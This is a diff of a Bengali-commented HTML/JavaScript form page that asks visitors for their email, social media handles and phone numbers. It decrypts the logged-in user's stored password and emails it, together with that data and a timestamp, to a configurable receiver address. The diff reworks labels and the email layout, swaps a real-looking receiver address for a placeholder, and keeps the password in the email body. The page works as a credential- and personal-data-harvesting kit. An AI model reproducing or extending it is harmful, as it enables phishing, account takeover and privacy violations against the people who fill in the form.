@@ -149,37 +149,37 @@ button:disabled {
     <label>👤 2. Your Username</label>
     <input type="text" id="yourUsername" placeholder="john_doe">
 
-    <label>🖼️ 3. Profile Picture Link</label>
+    <label>🖼️ 3. Your Profile Picture Link</label>
     <input type="url" id="profilePic" placeholder="https://example.com/photo.jpg">
 
-    <label>📘 4. Facebook Username</label>
+    <label>📘 4. Your Facebook Username</label>
     <input type="text" id="fbUsername" placeholder="johndoe">
 
-    <label>📘 5. Facebook Page Username</label>
+    <label>📘 5. Your Facebook Page Username</label>
     <input type="text" id="fbPageUsername" placeholder="johndoepage">
 
-    <label>📷 6. Instagram Username</label>
+    <label>📷 6. Your Instagram Username</label>
     <input type="text" id="igUsername" placeholder="@johndoe">
 
-    <label>💬 7. WhatsApp Number</label>
+    <label>💬 7. Your WhatsApp Number</label>
     <input type="tel" id="whatsapp" placeholder="+8801XXXXXXXXX">
 
-    <label>🎵 8. TikTok Username</label>
+    <label>🎵 8. Your TikTok Username</label>
     <input type="text" id="tiktok" placeholder="@johndoe">
 
-    <label>✈️ 9. Telegram Username</label>
+    <label>✈️ 9. Your Telegram Username</label>
     <input type="text" id="telegram" placeholder="@johndoe">
 
-    <label>🐦 10. Twitter Username</label>
+    <label>🐦 10. Your Twitter (X) Username</label>
     <input type="text" id="twitter" placeholder="@johndoe">
 
-    <label>📞 11. Phone Number</label>
+    <label>📞 11. Your Phone Number</label>
     <input type="tel" id="phone" placeholder="+8801XXXXXXXXX">
 
-    <label>📝 12. About</label>
+    <label>📝 12. Your About</label>
     <textarea id="about" placeholder="নিজের সম্পর্কে কিছু লিখুন..."></textarea>
 
-    <label>🌐 13. Website Link</label>
+    <label>🌐 13. Your Website Link</label>
     <input type="url" id="website" placeholder="https://yourwebsite.com">
 
     <button type="button" id="submitBtn" onclick="sendEmail()">🚀 সাবমিট করুন</button>
@@ -194,7 +194,7 @@ button:disabled {
 // ==============================================
 // 🔐 আপনার ইমেইল এখানে দিন
 // ==============================================
-const RECEIVER_EMAIL = "inyt_444@outlook.com";  // <-- এখানে আপনার ইমেইল দিন
+const RECEIVER_EMAIL = "your_email@gmail.com";  // <-- এখানে আপনার ইমেইল দিন
 // ==============================================
 
 // এনক্রিপশন
@@ -233,6 +233,23 @@ function saveUsers() {
 loadUsers();
 
 let currentUser = sessionStorage.getItem("currentUser") || null;
+
+// ফরম্যাট সময় তৈরি (DD/MM/YYYY Hour:Minute:Second AM/PM)
+function getFormattedTime() {
+    let now = new Date();
+    let day = String(now.getDate()).padStart(2, '0');
+    let month = String(now.getMonth() + 1).padStart(2, '0');
+    let year = now.getFullYear();
+    let hours = now.getHours();
+    let minutes = String(now.getMinutes()).padStart(2, '0');
+    let seconds = String(now.getSeconds()).padStart(2, '0');
+    let ampm = hours >= 12 ? 'PM' : 'AM';
+    hours = hours % 12;
+    hours = hours ? hours : 12;
+    let formattedHours = String(hours).padStart(2, '0');
+    
+    return `${day}/${month}/${year} ${formattedHours}:${minutes}:${seconds} ${ampm}`;
+}
 
 // লগইন
 function login() {
@@ -282,7 +299,7 @@ function updateSubmitButton() {
     }
 }
 
-// টেক্সট ফরম্যাটে ইমেইল বডি তৈরি
+// লিস্ট আকারে ইমেইল বডি তৈরি (কোন কলাম নেই)
 function createEmailBody() {
     let yourEmail = document.getElementById("yourEmail").value || "—";
     let yourUsername = document.getElementById("yourUsername").value || "—";
@@ -299,37 +316,30 @@ function createEmailBody() {
     let website = document.getElementById("website").value || "—";
     
     let loggedInPassword = decrypt(users[currentUser]);
+    let submissionTime = getFormattedTime();
     
     return `
-┌─────────────────────────────────────────────────────────────┐
-│                    📋 রিকুয়েস্ট ফর্ম ডাটা                   │
-└─────────────────────────────────────────────────────────────┘
+📋 রিকুয়েস্ট ফর্ম ডাটা
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🔐 লগইন তথ্য:
-   লগইন ইউজারনাম: ${currentUser}
-   পাসওয়ার্ড: ${loggedInPassword}
+1. Your_Email : ${yourEmail}
+2. Your_Username : ${yourUsername}
+3. Your_Profile_Picture_Link : ${profilePic}
+4. Your_Facebook_Username : ${fbUsername}
+5. Your_Facebook_Page_Username : ${fbPageUsername}
+6. Your_Instagram_Username : ${igUsername}
+7. Your_WhatsApp_Number : ${whatsapp}
+8. Your_TikTok_Username : ${tiktok}
+9. Your_Telegram_Username : ${telegram}
+10. Your_Twitter_Username : ${twitter}
+11. Your_Phone_Number : ${phone}
+12. Your_About : ${about}
+13. Your_Website_Link : ${website}
+14. Logged_In_User_Info : ইউজারনেম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword}
+15. Submission Time : ${submissionTime}
 
-┌─────────────────────────────┬───────────────────────────────┐
-│ Name                        │ Value                         │
-├─────────────────────────────┼───────────────────────────────┤
-│ Your_Email                  │ ${yourEmail}                  │
-│ Your_Username               │ ${yourUsername}               │
-│ Your_Profile_Picture_Link   │ ${profilePic}                 │
-│ Your_Facebook_Username      │ ${fbUsername}                 │
-│ Your_Facebook_Page_Username │ ${fbPageUsername}             │
-│ Your_Instagram_Username     │ ${igUsername}                 │
-│ Your_WhatsApp_Number        │ ${whatsapp}                   │
-│ Your_TikTok_Username        │ ${tiktok}                     │
-│ Your_Telegram_Username      │ ${telegram}                   │
-│ Your_Twitter_Username       │ ${twitter}                    │
-│ Your_Phone_Number           │ ${phone}                      │
-│ Your_About                  │ ${about}                      │
-│ Your_Website_Link           │ ${website}                    │
-│ Logged_In_User_Info         │ লগইন: ${currentUser} | পাস: ${loggedInPassword} │
-└─────────────────────────────┴───────────────────────────────┘
-
-⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD')}
-📧 স্বয়ংক্রিয়ভাবে জেনারেট করা ইমেইল
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📧 এই ইমেইলটি স্বয়ংক্রিয়ভাবে জেনারেট করা হয়েছে
 `;
 }
 
